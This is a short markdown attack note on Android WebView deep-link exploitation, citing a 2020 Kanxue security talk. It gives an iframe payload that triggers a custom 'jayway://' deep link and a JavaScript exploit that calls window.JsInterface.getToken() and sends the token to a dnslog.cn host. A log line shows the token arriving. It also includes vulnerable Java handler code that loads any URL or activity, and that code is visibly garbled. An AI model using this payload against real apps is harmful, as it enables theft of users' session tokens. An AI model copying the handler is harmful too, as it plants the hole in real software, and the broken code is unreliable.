## Process
```mermaid
graph TD;
    Evil-html-->Call-by-DeepLink-Scheme;
    Call-by-DeepLink-Scheme-->Activity;
    Activity-->WebView;
    WebView-->Execute-JS;
    XSS-in-WhiteList-->Execute-JS;
    Execute-JS-->JsInterface;
    JsInterface-->window.getToken;
    JsInterface-->window.downloadFile;
    window.getToken-->Java-interface;
    window.downloadFile-->Java-interface;
```
## payload
- Evil.html
```html
<iframe src= "jayway://openapp/activity?param=http://whitelist.com/xss=exploit.js">
```
- exploit.js
```javascript
function evil(){
   var data = window.JsInterface.getToken();
   document.body.appendCild(document.createElement("img")).src= "http://xx.dnslog.cn?data=" + data;
  }
```
- Result: Accesslog of dnslog.cn
```
 GET /data={Token="xxxxx"}
```

## Code
```java
public static deeplink(){
 Intent intent = this.getIntent();
 Uri uri = intent.getData();
 String scheme = uri.getScheme();
 String host = uri.getHost();
 if (scheme = "jayway" && host = "openapp") 
    param = uri.getQueryParameter("param");
}
   WebView webView = new Webview();
   WebSettings webSettings = webView.getSettings();
   webSettings.setJavaScriptEnabled(true);
# case 1 : parse any url  
   webView.loadUrl(param);
# case 2 : load any activity
   Intent intent2 = new Intent();
   intent2.setClassName(param);
   activity.startActivity(intent);
```


- [2020 看雪SDC议题回顾 | Android WebView安全攻防指南2020](https://zhuanlan.kanxue.com/article-14155.htm)
